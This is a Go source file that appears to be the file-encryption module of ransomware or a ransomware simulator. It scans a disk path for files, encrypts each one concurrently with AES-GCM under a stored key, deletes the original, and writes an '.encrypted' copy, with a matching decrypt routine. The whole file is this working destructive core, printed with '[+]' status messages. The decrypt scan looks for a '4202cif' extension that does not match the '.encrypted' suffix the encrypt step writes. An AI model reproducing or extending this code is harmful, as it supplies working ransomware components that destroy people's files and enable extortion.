package encrypt

import (
	"ase/utils"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"sync"
)

func Encrypt(inputFile, key, iv, mode string) error {
	// Read the file
	plaintext, err := ioutil.ReadFile(inputFile)
	if err != nil {
		return err
	}

	// Reencode the string to UTF-8
	newkey := []byte(strings.ToValidUTF8(key, ""))

	// Create a new cipher block
	block, err := aes.NewCipher(newkey)
	if err != nil {
		fmt.Println("Error: ", err)
		return err
	}

	// Create a new GCM
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	// Encrypt the file
	result := gcm.Seal(nonce, nonce, plaintext, nil)

	// Delete the original file
	err = os.Remove(inputFile)
	if err != nil {
		return err
	}

	// Create the output filename
	var outputFile = inputFile + ".encrypted"

	// Write the result to the output file
	err = ioutil.WriteFile(outputFile, result, 0644)
	if err != nil {
		return err
	}

	return nil
}

func Decrypt(inputFile, key, iv, mode string) error {
	// Read the file
	ciphertext, err := ioutil.ReadFile(inputFile)
	if err != nil {
		return err
	}

	// Reencode the string to UTF-8
	newkey := []byte(strings.ToValidUTF8(key, ""))

	// Create a new cipher block
	block, err := aes.NewCipher(newkey)
	if err != nil {
		fmt.Println("Error: ", err)
		return err
	}

	// Create a new GCM
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	// Check the length of the ciphertext
	if len(ciphertext) < gcm.NonceSize() {
		return fmt.Errorf("ciphertext is too short")
	}

	// Extract the nonce from the ciphertext
	nonce, ciphertext := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]

	// Decrypt the file
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	// Delete the original encrypted file
	err = os.Remove(inputFile)
	if err != nil {
		return err
	}

	// Remove the .encrypted extension from the file name
	inputFile = strings.TrimSuffix(inputFile, ".encrypted")

	// Create the output filename without .encrypted extension
	var outputFile = inputFile

	// Write the result to the output file
	err = ioutil.WriteFile(outputFile, plaintext, 0644)
	if err != nil {
		return err
	}

	return nil
}

func StartDecrypt(path string) error {
	fmt.Println("[+] Discovering files...")
	// call the function to discover files with a list of one extension which is "4202cif"
	files, err := utils.DiscoverDisk(path, []string{"4202cif"})
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	fmt.Println("[+] Decrypting files...")
	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	for _, file := range files {
		// Increment the WaitGroup counter
		wg.Add(1)

		// Start a new goroutine
		go func(file string) {
			// Decrement the counter when the goroutine completes
			defer wg.Done()

			// Encrypt the file
			Decrypt(file, utils.GetKey(), utils.GetIV(), "gcm")
		}(file) // Pass file as argument to the function literal to avoid data race
	}

	// Wait for all goroutines to complete
	wg.Wait()

	// Print the number of files decrypted
	fmt.Println("[+] Decrypted", len(files), "files")
	return nil
}

func StartEncrypt(path string, files []string) error {
	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	for _, file := range files {
		// Increment the WaitGroup counter
		wg.Add(1)

		// Start a new goroutine
		go func(file string) {
			// Decrement the counter when the goroutine completes
			defer wg.Done()

			// Encrypt the file
			Encrypt(file, utils.GetKey(), utils.GetIV(), "gcm")
		}(file) // Pass file as argument to the function literal to avoid data race
	}

	// Wait for all goroutines to complete
	wg.Wait()

	return nil
}
